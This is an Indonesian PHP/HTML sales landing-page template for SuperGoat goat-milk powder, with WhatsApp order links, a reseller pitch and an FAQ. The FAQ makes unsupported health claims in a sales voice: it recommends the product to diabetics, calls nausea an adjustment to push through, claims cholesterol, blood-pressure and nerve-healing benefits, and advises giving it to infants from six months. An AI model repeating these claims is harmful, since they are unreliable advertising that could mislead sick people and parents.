                                                                            <div class="elementor-image"> <img width="577" height="917" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/13-1.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/13-1.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/13-1-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-f7327ae elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="f7327ae" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-ee24466 elementor-column elementor-col-50 elementor-inner-column" data-id="ee24466" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-e55493f elementor-widget elementor-widget-image" data-id="e55493f" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/14-1.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/14-1.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/14-1-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-1690383 elementor-column elementor-col-50 elementor-inner-column" data-id="1690383" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-004bd7e elementor-widget elementor-widget-image" data-id="004bd7e" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/15-1.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/15-1.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/15-1-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-52a8ebd elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="52a8ebd" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-f3e7b21 elementor-column elementor-col-50 elementor-inner-column" data-id="f3e7b21" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-7c34b3b elementor-widget elementor-widget-image" data-id="7c34b3b" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="917" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/16-1.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/16-1.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/16-1-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-3035237 elementor-column elementor-col-50 elementor-inner-column" data-id="3035237" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-c10f3f1 elementor-widget elementor-widget-image" data-id="c10f3f1" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/17-1.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/17-1.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/17-1-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-1b17c666 elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="1b17c666" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-31911056 elementor-column elementor-col-100 elementor-top-column" data-id="31911056" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-69176299 elementor-widget elementor-widget-heading" data-id="69176299" data-element_type="widget" data-widget_type="heading.default">
                                                <div class="elementor-widget-container">
                                                    <p class="elementor-heading-title elementor-size-default">DISCLAIMER:
                                                        <div style='padding-top:5px;font-family: "Roboto", Sans-serif;color:#ff1000;font-size: 13px;font-weight: 300;line-height: 1.3;'>
                                                            <ul style="list-style:disc;margin-left:20px">
                                                                <li> Hasil yang didapatkan bisa berbeda pada tiap orang tergantung pada kondisi tubuh masing-masing.
                                                                    <br/>
                                                                </li>
                                                                <li>Agar mendapatkan hasil yang maksimal dari SuperGoat, selama masa konsumsi disarankan untuk menerapkan pola hidup sehat. Seperti mengubah pola makan dan melakukan olahraga rutin.</li>
                                                        </div>
                                                    </p>
                                                </div>
                                            </div>
                                            <div class="elementor-element elementor-element-d52dd1e elementor-widget elementor-widget-image" data-id="d52dd1e" data-element_type="widget" data-widget_type="image.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-image"> <img width="960" height="843" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/sdfds.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/sdfds.png 960w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/sdfds-300x263.png 300w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/sdfds-768x674.png 768w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/sdfds-860x755.png 860w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/sdfds-600x527.png 600w" sizes="(max-width: 960px) 100vw, 960px" /></div>
                                                </div>
                                            </div>
                                            <section class="elementor-element elementor-element-ae7eef2 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="ae7eef2" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-d74fa20 elementor-column elementor-col-33 elementor-inner-column" data-id="d74fa20" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-893861e elementor-column elementor-col-33 elementor-inner-column" data-id="893861e" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-eee0736 elementor-widget elementor-widget-text-editor" data-id="eee0736" data-element_type="widget" data-widget_type="text-editor.default">
                                                                        <div class="elementor-widget-container" style="background-color:green;">
                                                                            <div class="elementor-text-editor elementor-clearfix">
                                                                                <p></p>
                                                                                <p><span style="color: #ffffff;"><a href="https://wa.me/<?= $nomor_telepon ?>?text=Halo+ka%2C+saya+ingin+pesan+SuperGoat.+Bagaimana+caranya%3F" target="blank">BELI SEKARANG</a></span></p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-d180756 elementor-column elementor-col-33 elementor-inner-column" data-id="d180756" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-ae7eef2 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="ae7eef2" data-element_type="section" style="background-color:#ffaf00">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-d74fa20 elementor-column elementor-col-33 elementor-inner-column" data-id="d74fa20" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                        <h2 style='text-align:center;'>
                                                        Mau dapat penghasilan tambahan jutaan rupiah per bulan ? <br> Daftar Reseller saudagarkaya.com aja
                                                        </h2>
                                                        <div class="elementor-element elementor-element-d180756 elementor-column elementor-col-33 elementor-inner-column" data-id="d180756" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-ae7eef2 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="ae7eef2" data-element_type="section"  style="background-color:#ffaf00">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-d74fa20 elementor-column elementor-col-33 elementor-inner-column" data-id="d74fa20" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>

                                                        <div class="elementor-element elementor-element-91bfed5 elementor-column elementor-col-33 elementor-inner-column" data-id="91bfed5" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-885891c elementor-widget elementor-widget-text-editor" data-id="885891c" data-element_type="widget" data-widget_type="text-editor.default">
                                                                        <div class="elementor-widget-container" style="background-color:green;">
                                                                            <div class="elementor-text-editor elementor-clearfix">
                                                                                <p></p>

                                                                                <p><span style="color: #ffffff;"><a href="http://saudagarkaya.com/reseller/<?= $username; ?>" >DAFTAR RESELLER</a></span></p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-d180756 elementor-column elementor-col-33 elementor-inner-column" data-id="d180756" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <div class="elementor-element elementor-element-447328f elementor-widget elementor-widget-spacer" data-id="447328f" data-element_type="widget" data-widget_type="spacer.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-spacer">
                                                        <div class="elementor-spacer-inner"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-458465f5 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="458465f5" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-container elementor-column-gap-default">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-45bfe735 elementor-column elementor-col-100 elementor-top-column" data-id="45bfe735" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-47cd8bbd elementor-widget elementor-widget-heading" data-id="47cd8bbd" data-element_type="widget" data-widget_type="heading.default">
                                                <div class="elementor-widget-container">
                                                    <h2 class="elementor-heading-title elementor-size-default">PERTANYAAN YANG SERING DITANYAKAN</h2></div>
                                            </div>
                                            <section class="elementor-element elementor-element-4c4cf87 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="4c4cf87" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-32fef65 elementor-column elementor-col-50 elementor-inner-column" data-id="32fef65" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-59127c4 elementor-widget elementor-widget-toggle" data-id="59127c4" data-element_type="widget" data-widget_type="toggle.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-toggle" role="tablist">
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-9331" class="elementor-tab-title" data-tab="1" role="tab" aria-controls="elementor-tab-content-9331"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Apakah SG ini aman diminum?</a></div>
                                                                                    <div >
                                                                                    	<ul>
                                                                                    		<li>
																						<p>Tentu saja sangat aman diminum. </p>
                                                                                        <p>SuperGoat adalah susu berkualitas premium dengan komposisi susu kambing murni dan gula aren kualitas terbaik. Perpaduan susu kambing yang kualitasnya terjaga dan gula aren yang kemurniannya juga terjaga akan memberikan manfaat yang optimal bagi konsumen. Dari segi kehalalan dan keamanan, susu kambing SuperGoat telah mendapat ijin dari MUI dan terdaftar di Badan POM RI No. 805012005047.</p>
                                                                                    		</li>
                                                                                    	</ul>

                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-9332" class="elementor-tab-title" data-tab="2" role="tab" aria-controls="elementor-tab-content-9332"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Apa bedanya dengan produk susu kambing merak lain?</a></div>
                                                                                    <div >
                                                                                        <ul>
                                                                                            <li>Saat ini satu satunya produk susu kambing bubuk dengan rasa gula aren adalah SuperGoat, dengan perpaduan susu kambing dengan gula aren sehingga memberikan citarasa yang enak dan gurih.</li>
                                                                                            <li>Komposisi dari SuperGoat dipadukan dengan gula aren murni kualitas bagus. Saat ini yang beredar susu kambing yang variannya banyak sekali tapi kita harus cermat memperhatikan komposisinya, karena banyak yang beredar komposisi susu kambingnya malahan paling sedikit, sedangkan komposisi creamernya paling dominan.</li>
                                                                                            <li>Proses produksinya diawasi dengan sangat ketat dari hulu sampai hilir sehingga ada jaminan kualitas terbaik yang akan dirasakan oleh konsumen.</li>
                                                                                            <li>Ada money back guarantee / garansi uang kembali 100%. Apabila minum 8 kotak tidak merasakan manfaat apapun.</li>
                                                                                        </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-9333" class="elementor-tab-title" data-tab="3" role="tab" aria-controls="elementor-tab-content-9333"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">SuperGoat hanya ada kemasan sachet, mengapa harus sachet, mengapa tidak ada yang kiloan atau kalengan?</a></div>
                                                                                    <div >
                                                                                    	<ul>
                                                                                    		<li>
                                                                                        <p>Kemasan <em>sachet</em> adalah untuk menjaga kualitas susu tersebut, kalau pakai yang kiloan atau dalam kemasan yang lebih besar, dikuatirkan gampang terkontaminasi dengan udara luar, untuk menjaga agar tetap hiegenis dan kualitasnya tetap terjaga maka kemasan yang kita gunakan adalah <em>sachet</em>, sehingga ketika dibuka <em>sachet</em> yang 25 gr akan langsung habis dikonsumsi.</p>
                                                                                    </li>
                                                                                </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-9334" class="elementor-tab-title" data-tab="4" role="tab" aria-controls="elementor-tab-content-9334"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Di pasar kita perhatikan ada beberapa merek susu kambing dengan kemasan sachet @25 grx10=250 gr yang variasi harganya berkisar 30 rb sd 130 rb, mengapa bisa range harganya sangat jomplang?</a></div>
                                                                                    <div >
                                                                                    	<ul>
                                                                                    		<li>
                                                                                        <p>Tentu dalam melihat harga, perbandingannya harus apple to apple (sebanding) sehingga baru dapat kita simpulkan apakah harganya pantas atau tidak?
                                                                                            <br />Untuk produk yang menggunakan komposisi susu kambing yang hampir sama dengan SuperGoat (untuk rasa gula aren hanya SuperGoat satu-satu nya) maka kisaran harga yang ada saat ini antara 90 rb sd 150 rb bahkan ada yang lebih mahal. Jika dilihat dari value (nilai dan manfaat) yang diberikan, maka harga SuperGoat jauh lebih murah.
                                                                                            <br />Kami berharap SuperGoat dapat dinikmati serta dirasakan manfaatnya oleh banyak orang dengan harga yang terjangkau.</p>
                                                                                        </li>
                                                                                    </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-9335" class="elementor-tab-title" data-tab="5" role="tab" aria-controls="elementor-tab-content-9335"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Apakah SuperGoat menyebabkan mual – mual dan muntah?</a></div>
                                                                                    <div >
                                                                                    	<ul>
                                                                                    		<li>
                                                                                        <p>SuperGoat tidak menyebabkan mual – mual dan muntah. Apabila konsumen merasakan gejala tersebut setelah meminum SuperGoat, mungkin konsumen memiliki riwayat asam lambung atau maag. Saran konsumsi SuperGoat 2 jam sesudah makan.</p>
                                                                                        <p>SuperGoat memiliki efek antasida alami yang justru secara perlahan akan membantu penyembuhan masalah pencernaan. Untuk tahap awal bisa dikonsumsi beriringan dengan obat maag dengan jeda waktu 2 jam.</p>
                                                                                        <p>Mual – mual merupakan tahap penyesuaian tubuh, sehingga tetap lanjutkan minum SuperGoat 1 kali sehari.</p>
                                                                                    </li>
                                                                                </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-9336" class="elementor-tab-title" data-tab="6" role="tab" aria-controls="elementor-tab-content-9336"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Untuk konsumen yang memiliki gula darah rendah, apakah bagus minum SuperGoat?</a></div>
                                                                                    <div>
                                                                                    	<ul>
                                                                                    		<li>
                                                                                        <p>SuperGoat baik untuk konsumen hipoglikemia, karena SuperGoat mengandung karbohidrat baik dari susu kambing maupun dari gula arennya, meskipun indekglikemiknya rendah. Paling pas untuk maintenance, sedangkan tidak bisa untuk menaikkan kadar gula secara cepat.</p>
                                                                                    </li>
                                                                                </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-9337" class="elementor-tab-title" data-tab="7" role="tab" aria-controls="elementor-tab-content-9337"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Sekarang banyak sekali beredar minuman yang hanya menggunakan esens sebagai perasa kimia untuk coklat, stroberi, vanila dan sebagainya. Bahkan sekarang sedang ribut masalah susu kental manis yang ternyata tidak mengandung susu, lalu bagaimana dengan SuperGoat, apakah gula aren nya juga esens alias bukan gula aren yang sebenarnya?</a></div>
                                                                                    <div >
                                                                                    	<ul>
                                                                                    		<li>
                                                                                        <p>Rasa gula aren yang terkandung dalam susu SuperGoat adalah gula aren yang kualitasnya diawasi dengan sangat ketat, karena saat ini banyak sekali produk gula aren yang tidak murni alias ada campuran yang lain. Jadi bukan esens gula aren tapi gula aren dengan kualitas terbaik.</p>
                                                                                    </li>
                                                                                </ul>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-60f6cc1 elementor-column elementor-col-50 elementor-inner-column" data-id="60f6cc1" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-aceb672 elementor-widget elementor-widget-toggle" data-id="aceb672" data-element_type="widget" data-widget_type="toggle.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-toggle" role="tablist">
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-1811" class="elementor-tab-title" data-tab="1" role="tab" aria-controls="elementor-tab-content-1811"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Apa kelebihan minum susu kambing dibandingkan susu sapi?</a></div>
                                                                                    <div >
                                                                                        <ul>
                                                                                            <li>Kambing harus diberikan makanan yang organik agar susunya bisa banyak dan berkualitas, semakin organik makanannya maka susunya akan semakin banyak, berbeda dengan susu sapi, praktek yang dilakukan selama ini agar susunya banyak harus disuntik hormon, bahkan dapat menghasilkan 40 L susu perhari dengan cara menyuntikan hormon sehingga residu dari hormon yang disuntikan mempengaruhi susu sapi tersebut.</li>
                                                                                            <li>Protein susu kambing lebih rendah sehingga lebih aman bagi yang alergi terhadap susu sapi.</li>
                                                                                            <li>Lactosa lebih rendah sehingga lebih aman bagi gigi. Lactosa lebih rendah 0,2-0,5% dari susu sapi sehingga baik bagi yg mengalami lactose intolerant.(<em><strong>Jurnal Ilmu Produksi dan Teknologi hasil Peternakan 2017</strong></em>).</li>
                                                                                            <li>Gampang dicerna karena tidak mengandung aglutinin sehingga tidak mengalami klusterisasi (<em><strong>LPPM IPB 2009</strong></em>)</li>
                                                                                        </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-1812" class="elementor-tab-title" data-tab="2" role="tab" aria-controls="elementor-tab-content-1812"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Menkonsumsi daging kambing sering dikaitkan menjadi penyebab hipertensi, apakah boleh seseorang yang terkena hipertensi minum susu kambing?</a></div>
                                                                                    <div>
                                                                                          <ul>
                                                                                            <li>
                                                                                            	Susu kambing aman dan baik diminum bagi penderita hipertensi, karena mengandung mineral kalium (K) yang tinggi sehingga dapat berperan dalam menstabilkan tekanan darah.
                                                                                            </li>
                                                                                        </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-1813" class="elementor-tab-title" data-tab="3" role="tab" aria-controls="elementor-tab-content-1813"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Apakah susu SuperGoat ini aman bagi penderita diabetes?</a></div>
                                                                                    <div >
                                                                                        <ul>
                                                                                        	<li>Susu kambing mengandung A2 beta casein yang merangsang produksi insulin alami sehingga direkomendasikan untuk penderita diabetes, sedangkan susu sapi mengandung A1 Beta casein yang justru menghambat produksi insulin alami.</p>
                                                                                        <p>Dari 3736 laki-laki (10 th) bahwa pria yang kadar gula darahnya mengandung asam lemak yang tinggi dari whole fat, memiliki resiko terkena diabetes tipe 2 60% lebih kecil dibandingkan pria yang tidak memiliki kadar asam lemak yang tinggi di kadar gula darah nya. (<em><strong>Penelitian yang dipublikasikan di Annals of Internal Medicine Desember 2010</strong></em>)</p>
                                                                                        <p>Asam lemak lebih tinggi 35% dari susu sapi (<em><strong>LPPM IPB 2009</strong></em>).</p>
                                                                                        <p>Selain itu untuk rasa dikombinasi dengan gula aren yang justru aman bagi penderita diabetes. Berbeda jika digunakan pemanis yang memakai gula tebu yang sangat dibatasi pemakaiannya oleh penderita diabetes.</p>
                                                                                       	 </li>
                                                                                        </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-1814" class="elementor-tab-title" data-tab="4" role="tab" aria-controls="elementor-tab-content-1814"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Di pasar sudah banyak produk susu kambing, apa yang membedakan SuperGoat dengan produk susu kambing lainnya?</a></div>
                                                                                    <div >
                                                                                        <p>Perbedaannya banyak :</p>
                                                                                        <ul>
                                                                                            <li>Saat ini satu satunya produk susu kambing bubuk dengan rasa gula aren adalah SuperGoat, dengan perpaduan susu kambing dengan gula aren sehingga memberikan citarasa yang enak dan gurih.</li>
                                                                                            <li>Komposisi dari SuperGoat dipadukan dengan gula aren murni kualitas terbaik. Saat ini banyak varian susu kambing yang beredar, tetapi kita harus cermat memperhatikan komposisinya, karena yang beredar saat ini, memiliki komposisi susu kambing yang sedikit dan bahkan lebih banyak <em>creamernya</em>.</li>
                                                                                            <li>SuperGoat memiliki <strong><em>money back guarantee</em></strong>, yaitu apabila minum 8 kotak tidak merasakan manfaat apapun, uang akan dikembalikan 100%.</li>
                                                                                            <li>Saat ini SuperGoat dipasarkan melalui konsep yang sudah terbukti berhasil membantu banyak orang.</li>
                                                                                        </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-1815" class="elementor-tab-title" data-tab="5" role="tab" aria-controls="elementor-tab-content-1815"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Apakah SuperGoat dapat dikonsumsi untuk anak – anak dibawah usia 1 tahun?</a></div>
                                                                                    <div >
                                                                                    	<ul>
                                                                                        	<li>
                                                                                        <p>SuperGoat dapat dikonsumsi dari usia 6 bulan. Untuk anak – anak dibawah 4 tahun, berikan 1 sachet, dapat dibagi 2. Jika ditakar dengan sendok takar ( ukuran 5 gram) sejumlah 4 sendok dan airnya 100 cc .</p>
                                                                                    </li>
                                                                                </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-1816" class="elementor-tab-title" data-tab="6" role="tab" aria-controls="elementor-tab-content-1816"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Apakah minum SuperGoat mengakibatkan penyakit kolesterol?</a></div>
                                                                                    <div >
                                                                                    	<ul>
                                                                                        	<li>
                                                                                        <p>Asam lemak linoleat dan linolenat dalam susu kambing justru berfungsi menurunkan kolesterol, terutama triglyceride dapat membersihkan plasma darah dari lipoprotein.</p>
                                                                                    </li>
                                                                                </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="elementor-toggle-item">
                                                                                    <div id="elementor-tab-title-1817" class="elementor-tab-title" data-tab="7" role="tab" aria-controls="elementor-tab-content-1817"> <span class="elementor-toggle-icon elementor-toggle-icon-left" aria-hidden="true"> <span class="elementor-toggle-icon-closed"><i class="far fa-arrow-alt-circle-right"></i></span> <span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened far fa-arrow-alt-circle-up"></i></span> </span> <a href="#">Apakah SuperGoat dapat membantu dalam penyembuhan saraf?</a></div>
                                                                                    <div >
                                                                                    	<ul>
                                                                                        	<li>
                                                                                        <p>SuperGoat mengandung arginin yang memperlancar peredaran darah daerah saraf yang sakit. Omega 3 dalam SuperGoat membantu memberikan nutrisi pada syaraf serta ditambah lagi vitamin yang terdapat dalam gula aren.</p>
                                                                                    </li>
